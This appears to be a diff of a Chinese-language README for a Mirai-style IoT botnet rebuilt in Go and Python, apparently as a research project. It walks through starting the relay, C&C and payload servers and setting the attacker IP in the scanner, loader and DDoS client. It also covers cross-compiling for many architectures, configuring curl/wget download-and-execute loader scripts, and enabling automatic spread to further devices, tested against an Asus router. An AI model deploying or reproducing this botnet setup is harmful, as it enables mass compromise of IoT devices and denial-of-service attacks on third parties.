@@ -37,7 +37,24 @@
 
   * ```CNC```，在此資料夾中實現CNC client功能，程式碼中實現已layer 7的DDoS攻擊，當執行階段的時候會與CNC server保持連接，並等候CNC server發送指令，當CNC server傳送指令並接收到時，會解析指令是否為ddos開頭，當指令為ddos開頭並且參數為IP位置，則會建立一個ddos攻擊並持續60s，這些攻擊與參數可自行設定。
 
-在研究並實現的過程中，由於需要重複測試以及利用，因此並未實現Mirai原始碼中的停止watch dog、destroy process、Kill_init()等相關功能，以便後續裝置能夠正常運作。
+  其中，因為要讓該程式碼進行編譯，在資料夾中有build.sh是用來自動編譯這些檔案成不同架構，其中架構如下:
+  ```
+  linux/386
+  linux/amd64
+  linux/arm
+  linux/arm64
+  linux/loong64
+  linux/mips
+  linux/mips64
+  linux/mips64le
+  linux/mipsle
+  linux/ppc64
+  linux/ppc64le
+  linux/riscv64
+  ```
+  最後會將編譯完的可執行檔存放到```ELF_file```資料夾中。
+
+*在研究並實現的過程中，由於需要重複測試以及利用，因此並未實現Mirai原始碼中的停止watch dog、destroy process、Kill_init()等相關功能，以便後續裝置能夠正常運作。*
 
 ## Build & Env
 
@@ -69,7 +86,7 @@ sudo apt install golang-go
 
 首先，需要啟動一些功能與設定一些參數
 
-開啟ip_config.ini後，找到relayIP，將後面的IP位置設定為ifconfig所查詢到的IP，以範例，我們將網路連到同一Router底下，並查詢IP位置為192.168.6.97，因此設定如下
+開啟ip_config.ini後，找到relayIP，將後面的IP位置設定為ifconfig所查詢到的IP，在此範例中將網路連到同一Router底下，並查詢IP位置為192.168.6.97，因此設定如下 (實際情況依照自身電腦設定)
 
 ```
 {
@@ -77,4 +94,159 @@ sudo apt install golang-go
   "targetIP": "192.168.1.167"   # Not Use
 }
 ```
+儲存
 
+接著，需要啟動```Relay.py```、```CNC.py```和```bin_server.py```，開啟不同terminal後
+
+```
+python3 relay.py
+```
+你將會看到
+```
+[17:14:30] [INFO] Starting relay on port: 31337
+[17:14:30] [WARNING] Configuration set to allow 100 connections..
+[17:14:30] [INFO] Relay is online!
+```
+表示該DB已準備好
+
+到另一個terminal中
+```
+python3 CNC.py
+```
+會出現，表示CNC server啟動並待命
+
+```
+C&C Server is listening on 192.168.6.97:12348
+```
+
+最後啟動提供bin file的Server，
+
+```
+python3 bin_server.py
+```
+如果出現以下，表示執行成功。
+
+```
+[17:19:15] [INFO] Webserver started at:192.168.6.97:3133
+```
+---
+如果以上執行過程中出現相似錯誤
+```
+Exception in thread Thread-1:
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
+Enter something command to device :
+    self.run()
+  File "/usr/lib/python3.8/threading.py", line 870, in run
+    self._target(*self._args, **self._kwargs)
+  File "CNC.py", line 34, in start_server
+    server_socket.bind((host, port))
+OSError: [Errno 99] Cannot assign requested address
+```
+表示IP給定錯誤，需要檢查主機IP是否正確，能夠讓外部與主機通訊。
+
+---
+
+接著，啟動完成後，需要編譯感染檔案，進到```device_side```資料夾中
+
+首先設定```scanner.go```，找到```__RELAY_H__```變數，並且設定成攻擊者電腦的IP，以這個範例示意至```line 77```，設定如下
+
+```
+	__RELAY_H__   = "192.168.6.97"
+```
+並且到 ```main()``` 中，選擇設定感染方式，可以自行移除註解，以下範例。
+
+```
+func main() {
+	fmt.Println("[Scanner] Scanner process started ..")
+	isSSHOpen("192.168.1.163")   // 掃描192.168.1.163的SSH 
+	
+	//isTelnetOpen("192.168.1.163","23")  
+        // 掃描192.168.1.163的Telnet，考慮到Telnet可能有23、2323 port 可以設定
+	
+	//Scanner()    // 掃描全域
+
+	//if validateC2("192.168.6.97","31337"){   // 測試儲存資料到relay中
+	//	c2crd("test","test","192.168.6.97","31337")
+	//} //test connect relay
+
+	time.Sleep(20*time.Second)  // wait program
+}
+```
+接著，設定```loader.go```，同樣找到```__RELAY_H__```變數，並且也同樣設定攻擊者IP，如範例在```line 14```中設定
+
+```
+__RELAY_H__   = "192.168.6.97"
+```
+最後，設定CNC client，在cnc.go中在```line 79```中設定攻擊者IP
+
+```
+host := "192.168.6.97"
+```
+
+至此，就可以設定完device感染的操作，再來就是進行編譯
+
+在```./device_side/build.sh```已寫好Go語言[交叉編譯](https://zh.wikipedia.org/zh-tw/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8)多個指令的script，因此直接執行即可
+```
+chmod +x build.sh
+sh ./build.sh
+```
+or
+```
+chmod +x build.sh
+./build.sh
+```
+此時編譯就會開始，編譯完成的檔案將會存放於```../ELF_file/bin/```路徑底下
+
+然後，來到```ELF_file/bin/```資料夾中，找到```curl_download_exec.sh```跟```wget_download_exec.sh```，這兩個檔案是loader加載時，要移植檔案到系統上所使用的簡易script，會進行判斷裝置系統架構並決定要從攻擊者上的bin_server中下載對應架構的ELF file。
+
+因此需要對裡面的IP進行設定
+
+```
+sudo nano curl_download_exec.sh
+```
+找到設定ip的地方，填入攻擊者IP，並且由於bin server採用31338 port，因此設定如下
+```
+ip = "192.168.6.97:31338"    // set your bin server IP:Port
+```
+```wget_download_exec.sh```檔案亦是相同
+```
+sudo nano curl_download_exec.sh
+```
+同樣找到ip處並進行設定
+```
+ip = "192.168.6.97:31338"  // set your bin server IP:Port
+```
+
+最後，要注意的是，因為感染通常都是自動的，IoT裝置會自動執行程式碼並且於背景執行
+
+所以在剛剛的```wget_download_exec.sh```與```curl_download_exec.sh```，的下方可以找到如下程式碼
+
+```
+chmod +x scanner
+chmod +x loader
+chmod +x cnc
+#./scanner > /dev/null 2>&1 &
+#./cnc > /dev/null 2>&1 &
+```
+
+如果要讓程式能夠自動的感染到下一個裝置上則將#註解取消，如果只是需要觀察檔案是否存在於裝置中，則照預設的方式即可
+
+操作完指令後，即可發起攻擊
+
+在此範例中我們以Asus RT-AX88U作為靶機IoT裝置測試
+
+可以先選擇scanner要使用什麼mode進行掃描，在```scanner.py```的```main()```中，假設要利用SSH的方式進行scanner，並且我們在已知裝置為192.168.6.163的情況，我們將Scanner的參數帶入(2,"192.168.6.163")，程式碼如下
+
+```
+if __name__ == '__main__':
+    print("[Scanner] Scanner process started ..")
+    #validateC2() # Test to connect remote DB
+    Scanner(2,"192.168.6.163")
+    #is_telent_open("192.168.0.1")
+```
+接著執行
+```
+python3 scanner.py
+```
+如下圖
